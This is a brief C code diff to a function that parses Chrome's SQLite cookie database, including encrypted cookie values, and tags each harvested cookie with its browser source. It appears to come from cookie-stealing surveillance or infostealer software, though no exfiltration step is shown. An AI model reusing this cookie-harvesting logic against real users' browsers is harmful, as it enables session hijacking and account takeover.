@@ -86,9 +86,9 @@ int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azC
 // 		if (!_stricmp(name, "GMAIL_IMP"))
 // 			__asm int 3;
 		if (value[0]==NULL && enc_value_a[0]!=NULL) // Se era un cookie cifrato
-			AddCookieA(host, name, enc_value_a);
+			AddCookieA(host, name, enc_value_a, COOKIE_FROM_CHROME);
 		else
-			AddCookieA(host, name, value);
+			AddCookieA(host, name, value, COOKIE_FROM_CHROME);
 	}
 
 	SAFE_FREE(host);
